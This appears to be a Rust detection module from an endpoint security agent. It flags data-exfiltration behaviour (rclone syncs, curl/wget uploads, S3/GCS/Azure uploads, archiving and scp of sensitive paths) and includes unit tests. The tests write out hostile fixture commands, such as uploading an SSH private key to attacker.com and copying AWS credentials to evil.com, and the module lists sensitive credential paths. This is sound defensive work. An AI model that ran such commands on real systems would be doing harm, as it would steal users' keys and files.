/// Data Exfiltration Detection — Tranche 3 Upgrade 2
///
/// Detects curl/wget uploads, rclone sync, cloud storage uploads, sensitive directory
/// archiving, and cloud sync tools targeting sensitive paths.
///
/// MITRE coverage:
///   T1041  — Exfiltration Over C2 Channel
///   T1560.001 — Archive Collected Data: Archive via Utility
///   T1567  — Exfiltration Over Web Service
///   T1567.002 — Exfiltration Over Web Service: Exfiltration to Cloud Storage
///   T1074.001 — Data Staged: Local Data Staging
use crate::models::{AlertSeverity, ProcessInfo, TelemetryEvent};
use chrono::DateTime;
use chrono::Utc;
use serde_json::json;
use std::path::Path;

fn exfil_alert(
    now: DateTime<Utc>,
    event_type: &str,
    mitre: &str,
    severity: AlertSeverity,
    reason: &str,
    process: &ProcessInfo,
    trigger: &str,
) -> TelemetryEvent {
    TelemetryEvent::new(
        now,
        event_type,
        "core-agent/exfiltration",
        json!({
            "severity": severity.as_str(),
            "score": severity.score(),
            "category": "exfiltration",
            "reason": reason,
            "details": {
                "pid": process.pid,
                "ppid": process.ppid,
                "command": process.command,
                "args": process.args,
                "process_kind": process.process_kind,
                "parent_command": process.parent_command,
                "parent_process_kind": process.parent_process_kind,
                "trigger": trigger,
                "mitre_technique": mitre,
                "confidence": "high",
            }
        }),
    )
}

/// Detect data exfiltration patterns from a ProcessInfo.
pub fn detect_exfiltration(process: &ProcessInfo, now: DateTime<Utc>) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    let cmd_basename = Path::new(&process.command)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    let args_lower = process.args.to_ascii_lowercase();
    let parent_kind = process.parent_process_kind.as_deref().unwrap_or("");

    // Sensitive directories that, if archived or accessed, indicate staging/exfil
    let sensitive_paths = [
        "/documents", "/desktop", "/downloads", "/.ssh", "/.aws",
        "/.azure", "/.config/gcloud", "~/.kube", "~/.docker",
        "/library/keychains", "/passwords", "/credentials",
    ];

    // ── rclone exfiltration ───────────────────────────────────────────────────

    if cmd_basename == "rclone" {
        // rclone copy/sync/move to remote: — data exfiltration
        let subcommands = ["copy", "sync", "move", "copyto", "moveto"];
        let has_subcommand = subcommands.iter().any(|s| {
            args_lower.starts_with(s) || args_lower.contains(&format!(" {}", s))
        });
        // Remote targets contain a colon (e.g., "s3:", "gdrive:", "sftp:")
        let has_remote_target = args_lower.contains(':');

        if has_subcommand && has_remote_target {
            alerts.push(exfil_alert(
                now,
                "alert_rclone_exfiltration",
                "T1567.002",
                AlertSeverity::Critical,
                "rclone syncing data to remote storage — high-confidence exfiltration",
                process,
                "rclone_remote_sync",
            ));
        }
    }

    // ── curl upload ───────────────────────────────────────────────────────────

    if cmd_basename == "curl" {
        // -T / --upload-file — curl uploading a file
        // -X PUT or --request PUT — PUT method often used for uploads
        let is_upload = args_lower.contains(" -t ")
            || args_lower.starts_with("-t ")
            || args_lower.contains("--upload-file")
            || args_lower.contains("-x put")
            || args_lower.contains("--request put");

        if is_upload {
            // Is the upload referencing a sensitive path?
            let refs_sensitive = sensitive_paths.iter().any(|p| args_lower.contains(p));
            let severity = if refs_sensitive {
                AlertSeverity::Critical
            } else {
                AlertSeverity::High
            };
            alerts.push(exfil_alert(
                now,
                "alert_curl_upload_detected",
                "T1567",
                severity,
                "curl uploading file to remote — potential data exfiltration",
                process,
                "curl_upload",
            ));
        }

        // curl with large file size hint (--data-binary @large_file) from interpreter
        if (args_lower.contains("--data-binary @") || args_lower.contains("-d @"))
            && (parent_kind == "interpreter" || parent_kind == "unknown")
        {
            alerts.push(exfil_alert(
                now,
                "alert_large_outbound_transfer",
                "T1041",
                AlertSeverity::High,
                "curl posting binary file data from interpreter chain — possible exfiltration",
                process,
                "curl_binary_post",
            ));
        }
    }

    // ── wget upload ───────────────────────────────────────────────────────────

    if cmd_basename == "wget" {
        // wget --post-file or --post-data referencing sensitive paths
        if args_lower.contains("--post-file") || args_lower.contains("--post-data") {
            let refs_sensitive = sensitive_paths.iter().any(|p| args_lower.contains(p));
            if refs_sensitive || parent_kind == "interpreter" || parent_kind == "unknown" {
                alerts.push(exfil_alert(
                    now,
                    "alert_large_outbound_transfer",
                    "T1041",
                    AlertSeverity::High,
                    "wget posting data to remote — possible sensitive data exfiltration",
                    process,
                    "wget_post",
                ));
            }
        }
    }

    // ── Cloud storage CLI upload ──────────────────────────────────────────────

    // AWS S3 upload
    if cmd_basename == "aws" && args_lower.contains("s3") {
        let is_upload_op = args_lower.contains(" cp ") || args_lower.contains(" sync ")
            || args_lower.contains(" mv ");
        // Uploading: local path followed by s3:// destination
        let has_s3_dst = args_lower.contains("s3://");
        if is_upload_op && has_s3_dst {
            let refs_sensitive = sensitive_paths.iter().any(|p| args_lower.contains(p));
            let severity = if refs_sensitive { AlertSeverity::Critical } else { AlertSeverity::High };
            alerts.push(exfil_alert(
                now,
                "alert_cloud_storage_upload",
                "T1567.002",
                severity,
                "AWS CLI uploading data to S3 bucket — cloud exfiltration",
                process,
                "aws_s3_upload",
            ));
        }
    }

    // Google Cloud Storage / gsutil
    if cmd_basename == "gsutil" {
        let is_upload = args_lower.starts_with("cp ") || args_lower.contains(" cp ")
            || args_lower.starts_with("rsync ") || args_lower.contains(" rsync ");
        let has_gcs_dst = args_lower.contains("gs://");
        if is_upload && has_gcs_dst {
            alerts.push(exfil_alert(
                now,
                "alert_cloud_storage_upload",
                "T1567.002",
                AlertSeverity::High,
                "gsutil copying data to Google Cloud Storage — cloud exfiltration",
                process,
                "gsutil_upload",
            ));
        }
    }

    // Azure CLI storage upload
    if cmd_basename == "az" && args_lower.contains("storage") && args_lower.contains("blob") {
        let is_upload = args_lower.contains("upload") || args_lower.contains("upload-batch");
        if is_upload {
            alerts.push(exfil_alert(
                now,
                "alert_cloud_storage_upload",
                "T1567.002",
                AlertSeverity::High,
                "Azure CLI uploading blob to cloud storage — cloud exfiltration",
                process,
                "az_blob_upload",
            ));
        }
    }

    // ── Cloud sync tools accessing sensitive paths ────────────────────────────

    let cloud_sync_tools = ["dropbox", "onedrive", "box", "gdrive", "mega", "nextcloud"];
    let is_cloud_sync = cloud_sync_tools.iter().any(|t| cmd_basename.contains(t));

    if is_cloud_sync || (cmd_basename == "rclone" && !alerts.iter().any(|a| a.event_type == "alert_rclone_exfiltration")) {
        let refs_sensitive = sensitive_paths.iter().any(|p| args_lower.contains(p));
        if refs_sensitive {
            alerts.push(exfil_alert(
                now,
                "alert_cloud_sync_sensitive_file",
                "T1567.002",
                AlertSeverity::High,
                "Cloud sync tool accessing sensitive credential or key path — possible exfiltration",
                process,
                "cloud_sync_sensitive",
            ));
        }
    }

    // ── Sensitive directory archiving ─────────────────────────────────────────

    let archive_tools = ["zip", "tar", "gzip", "7z", "7za", "rar"];
    let is_archiver = archive_tools.iter().any(|t| cmd_basename == *t);

    if is_archiver {
        let refs_sensitive = sensitive_paths.iter().any(|p| args_lower.contains(p));
        // Only alert if archiving to /tmp, interpreter chain, or clearly staging
        let archive_dst_suspicious = args_lower.contains("/tmp/")
            || args_lower.contains("/var/folders/")
            || parent_kind == "interpreter"
            || parent_kind == "unknown";

        if refs_sensitive && archive_dst_suspicious {
            alerts.push(exfil_alert(
                now,
                "alert_sensitive_directory_archived",
                "T1560.001",
                AlertSeverity::High,
                "Archive tool compressing sensitive directory — data staging for exfiltration",
                process,
                "sensitive_dir_archived",
            ));
        }
    }

    // ── scp / rsync sensitive file transfer ───────────────────────────────────

    if cmd_basename == "scp" || cmd_basename == "rsync" {
        let refs_sensitive = sensitive_paths.iter().any(|p| args_lower.contains(p));
        // scp/rsync from interpreter chain or referencing sensitive files
        if refs_sensitive && (parent_kind == "interpreter" || parent_kind == "unknown") {
            alerts.push(exfil_alert(
                now,
                "alert_large_outbound_transfer",
                "T1041",
                AlertSeverity::High,
                "scp/rsync transferring sensitive file from interpreter chain — exfiltration indicator",
                process,
                "scp_rsync_sensitive",
            ));
        }
    }

    alerts
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::classify::classify_path;
    use crate::command_features::extract_features;
    use chrono::Utc;

    fn make_process(
        command: &str,
        args: &str,
        process_kind: &str,
        parent_kind: Option<&str>,
        parent_command: Option<&str>,
    ) -> ProcessInfo {
        ProcessInfo {
            pid: 2000,
            ppid: 500,
            command: command.to_string(),
            args: args.to_string(),
            process_kind: process_kind.to_string(),
            command_path_kind: classify_path(command),
            parent_command: parent_command.map(|s| s.to_string()),
            parent_args: None,
            parent_process_kind: parent_kind.map(|s| s.to_string()),
            parent_command_path_kind: None,
            behavior: extract_features(command, args),
        }
    }

    #[test]
    fn rclone_remote_sync_fires() {
        let now = Utc::now();
        let p = make_process(
            "/usr/local/bin/rclone",
            "copy /Users/victim/Documents gdrive:stolen",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_exfiltration(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_rclone_exfiltration"),
            "rclone copy to remote: should fire"
        );
    }

    #[test]
    fn curl_upload_file_fires() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/curl",
            "-T /Users/victim/.ssh/id_rsa https://attacker.com/upload",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_exfiltration(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_curl_upload_detected"),
            "curl -T should fire curl upload alert"
        );
    }

    #[test]
    fn aws_s3_upload_fires() {
        let now = Utc::now();
        let p = make_process(
            "/usr/local/bin/aws",
            "s3 cp /Users/victim/Documents s3://attacker-bucket/",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_exfiltration(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_cloud_storage_upload"),
            "aws s3 cp to s3:// should fire cloud storage upload"
        );
    }

    #[test]
    fn gsutil_upload_fires() {
        let now = Utc::now();
        let p = make_process(
            "/usr/local/bin/gsutil",
            "cp /Users/victim/Desktop gs://attacker-bucket/",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_exfiltration(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_cloud_storage_upload"),
            "gsutil cp to gs:// should fire"
        );
    }

    #[test]
    fn sensitive_dir_archived_to_tmp_fires() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/zip",
            "-r /tmp/stolen.zip /Users/victim/.ssh",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_exfiltration(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_sensitive_directory_archived"),
            "zip of .ssh to /tmp should fire sensitive directory archived"
        );
    }

    #[test]
    fn scp_sensitive_from_interpreter_fires() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/scp",
            "/Users/victim/.aws/credentials attacker@evil.com:/tmp/",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_exfiltration(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_large_outbound_transfer"),
            "scp of .aws credentials from interpreter should fire"
        );
    }

    #[test]
    fn normal_curl_download_does_not_fire() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/curl",
            "-o /tmp/output.txt https://example.com/file.txt",
            "user_app",
            Some("user_app"),
            Some("/Applications/Terminal.app/Contents/MacOS/Terminal"),
        );
        let alerts = detect_exfiltration(&p, now);
        assert!(
            alerts.is_empty(),
            "Normal curl download should not fire any exfiltration alerts"
        );
    }
}
